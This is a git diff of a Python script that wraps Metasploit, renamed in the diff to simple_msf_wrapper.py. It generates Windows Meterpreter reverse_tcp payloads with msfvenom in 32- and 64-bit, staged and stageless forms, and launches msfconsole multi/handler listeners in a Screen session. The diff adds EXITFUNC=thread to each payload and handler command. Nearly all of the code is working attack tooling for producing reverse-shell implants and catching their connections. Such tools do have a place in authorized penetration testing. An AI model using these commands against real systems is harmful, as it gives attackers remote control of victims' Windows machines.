@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# File name          : remote.py
+# File name          : simple_msf_wrapper.py
 # Author             : IllmaticJV
 # Date created       : 17 Apr 2023
 
@@ -8,8 +8,7 @@ import subprocess
 import time
 from colorama import init, Fore
 
-def intro():
-
+def banner():
     print("  _____  _            _  _                   _        __          __                                                             ")
     print(" / ____|| |          | || |                 | |       \ \        / /                                                             ")
     print("| (___  | |__    ___ | || |  ___   ___    __| |  ___   \ \  /\  / /  _ __   __ _  _ __   _ __    ___  _ __                       ")
@@ -33,14 +32,14 @@ def generate_payload(lhost, lport, arch, format, staged, output_path):
 # Generate the payload using msfvenom
     if arch == '32':
         if staged == 'y':
-            payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -a x86 -f {format} -o {output_path}"
+            payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a x86 -f {format} -o {output_path}"
         else:
-            payload = f"msfvenom -p windows/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -a x86 -f {format} -o {output_path}"
+            payload = f"msfvenom -p windows/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a x86 -f {format} -o {output_path}"
     elif arch == '64':
         if staged == 'y':
-            payload = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {format} -o {output_path}"
+            payload = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -f {format} -o {output_path}"
         else:
-            payload = f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f {format} -o {output_path}"
+            payload = f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -f {format} -o {output_path}"
     else:
         print("Invalid architecture.")
         exit()
@@ -63,14 +62,14 @@ def setup_handlers(migrate):
     # Start a new GNU Screen session and create a handler for the payload
     if arch == '32':
         if staged == 'y':
-            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;{mig}run -j;\""
+            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;set EXITFUNC thread;{mig}run -j;\""
         else:
-            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/meterpreter_reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;{mig}run -j;\""
+            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/meterpreter_reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;set EXITFUNC thread;{mig}run -j;\""
     elif arch == '64':
         if staged == 'y':
-            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;{mig}run -j;\""
+            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;set EXITFUNC thread;{mig}run -j;\""
         else:
-            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter_reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;{mig}run -j;\""
+            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter_reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;set EXITFUNC thread;{mig}run -j;\""
     return command
 
 def start_screen_session(session_name, command):
@@ -103,7 +102,7 @@ def attach_to_screen(session_name):
 
 if __name__ == "__main__":
     init() # initialize colorama
-    intro()
+    banner()
     # Prompt user for payload information
     lhost = input("Enter the LHOST for the payload: ")
     lport = input("Enter the LPORT for the payload: ")
